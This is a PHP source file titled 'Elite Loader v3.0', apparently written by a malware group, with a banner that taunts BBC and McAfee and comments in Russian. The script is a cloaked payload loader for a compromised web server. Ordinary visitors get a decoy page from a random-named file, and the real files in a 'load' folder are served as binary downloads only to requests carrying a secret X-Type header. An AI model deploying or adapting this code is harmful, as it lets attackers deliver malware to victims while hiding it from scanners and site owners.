<?php
error_reporting(0);
#################################################
#             Elite Loader v3.0                 #
#                                               #
#    (c)oded by [PRO]MAKE.ME TeaM :P            #
#                                               #
# To BBC and McAfee:                            #
# Project to capture The World                  #
#                      in the implementation.   #
#                                               #
#            You lose! Who next? :)             #
#                                               #
#################################################

if(empty($_SERVER['HTTP_X_TYPE'])){
    $echo = file_get_contents('http://'.$_SERVER['HTTP_HOST'].'/t2438tj3420t43hjt0thj340.php');
    #echo 'http://'.$_SERVER['HTTP_HOST'].'/t2438tj3420t43hjt0thj340.php';
    #@header('Status: 404 Not Found');
    #@header('HTTP/1.1 404 Not Found');
    #@header("Retry-After: 120");
    #@header("Connection: Close");
/*
    $echo .= '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
    <html><head>
    <title>404 Not Found</title>
    </head><body>
    <h1>Not Found</h1>
    <p>The requested URL '.$_SERVER['PHP_SELF'].' was not found on this server.</p>
    </body></html>';
*/
    #$echo = str_replace('/t2438tj3420t43hjt0thj340.php',$_SERVER['PHP_SELF'],$echo);
    echo $echo;
    die();
}

$file = explode("/",$_SERVER["REQUEST_URI"]);
# Смотрим что бы папка была наша =)
if($file[(count($file)-2)] != 'load'){ die('path'); }

$file = $file[(count($file)-1)];
if(!file_exists($file)){ die('file'); }

header($_SERVER['SERVER_PROTOCOL']." 200 OK");
header("Pragma: public");
header("Expires: 0");
header("Cache-Control:");
header("Cache-Control: public");
header("Content-Description: File Transfer");
header("Content-Type: application/octet-stream");
header('Content-Disposition: attachment; filename="'.$file.'";');
header("Content-Transfer-Encoding: binary");

# Выдаём файлик
@readfile($file);

?>
